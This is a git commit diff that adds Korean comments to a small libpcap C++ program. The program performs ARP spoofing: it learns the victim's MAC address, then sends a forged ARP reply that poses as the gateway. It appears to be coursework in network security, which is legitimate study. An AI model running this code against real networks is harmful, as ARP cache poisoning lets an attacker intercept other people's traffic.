d88afa23a8c11c2593e06a308533aea9d97d3447
seul <iseul2192@gmail.com>
2022-08-13 11:40:32 -0700

    주석 추가

--- main.cpp
+++ main.cpp
@@ -69,6 +69,7 @@ int GetInterfaceMacAddress(const char* dev, char* mac_str) {
 	return 0;
 }
 
+// Sender에게 Packet 보내기
 int SendPacketToSender(pcap_t* handle, char* my_mac_str, char* my_ip_str, char* sender_ip_str) {
 	EthArpPacket packet;
 
@@ -81,10 +82,10 @@ int SendPacketToSender(pcap_t* handle, char* my_mac_str, char* my_ip_str, char* 
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(my_mac_str);
-	packet.arp_.sip_ = htonl(Ip(my_ip_str));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(Ip(sender_ip_str));
+	packet.arp_.smac_ = Mac(my_mac_str); // 내 mac 주소
+	packet.arp_.sip_ = htonl(Ip(my_ip_str)); // 내 ip 주소
+	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // sender mac 주소는 아직 모름
+	packet.arp_.tip_ = htonl(Ip(sender_ip_str)); //sender ip 주소
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
@@ -94,11 +95,11 @@ int SendPacketToSender(pcap_t* handle, char* my_mac_str, char* my_ip_str, char* 
 	return 0;
 }
 
+// SendPacketToSender 함수로 보낸 패킷에 대한 응답 받기
+// sender의 Mac 주소를 알 수 있음
 Mac GetPacketFromSender(pcap_t* handle, char* sender_ip_str) {
 	while (true) {
 		struct pcap_pkthdr* header;
-		// struct EthHdr* ethernet;
-		// struct ArpHdr* arp;
 		struct EthArpPacket* eth_arp;
 
 		const u_char* packet;
@@ -111,10 +112,10 @@ Mac GetPacketFromSender(pcap_t* handle, char* sender_ip_str) {
 
 		eth_arp = (struct EthArpPacket*)packet;
 		 
-		if (eth_arp->eth_.type_ == htons(EthHdr::Arp))
+		if (eth_arp->eth_.type_ == htons(EthHdr::Arp)) // ARP 패킷인지 확인
 		{
-			if ((unsigned long)eth_arp->arp_.sip_ == htonl(Ip(sender_ip_str))) {
-				return Mac(eth_arp->arp_.smac_);
+			if ((unsigned long)eth_arp->arp_.sip_ == htonl(Ip(sender_ip_str))) {  // sender가 보낸 패킷인지 확인
+				return Mac(eth_arp->arp_.smac_); // sender Mac return
 			}
 		}
 	}
@@ -146,12 +147,15 @@ int main(int argc, char* argv[]) {
 	printf("my mac: %s\n", my_mac_str); // 함수 안에서만 출력됨
 	
 	char* sender_ip_str = argv[2];
-	SendPacketToSender(handle, my_mac_str, my_ip_str, sender_ip_str);
+	SendPacketToSender(handle, my_mac_str, my_ip_str, sender_ip_str); // sender에게 패킷 보내기
 
-	Mac sender_mac = GetPacketFromSender(handle, sender_ip_str);
+	Mac sender_mac = GetPacketFromSender(handle, sender_ip_str); // sender의 Mac 주소 알아내기
 
-	char* target_ip_str = argv[3];
+	char* target_ip_str = argv[3];	// gateway의 ip 주소
 
+
+	// 패킷 전송
+	// sender에게 gateway인 척 내 mac 주소를 전달
 	packet.eth_.dmac_ = sender_mac;
 	packet.eth_.smac_ = Mac(my_mac_str);
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -161,10 +165,10 @@ int main(int argc, char* argv[]) {
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(my_mac_str);
-	packet.arp_.sip_ = htonl(Ip(target_ip_str));
-	packet.arp_.tmac_ = sender_mac;
-	packet.arp_.tip_ = htonl(Ip(sender_ip_str));
+	packet.arp_.smac_ = Mac(my_mac_str); // 내 ip
+	packet.arp_.sip_ = htonl(Ip(target_ip_str)); // gateway ip
+	packet.arp_.tmac_ = sender_mac; // sender mac
+	packet.arp_.tip_ = htonl(Ip(sender_ip_str)); // sender ip
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
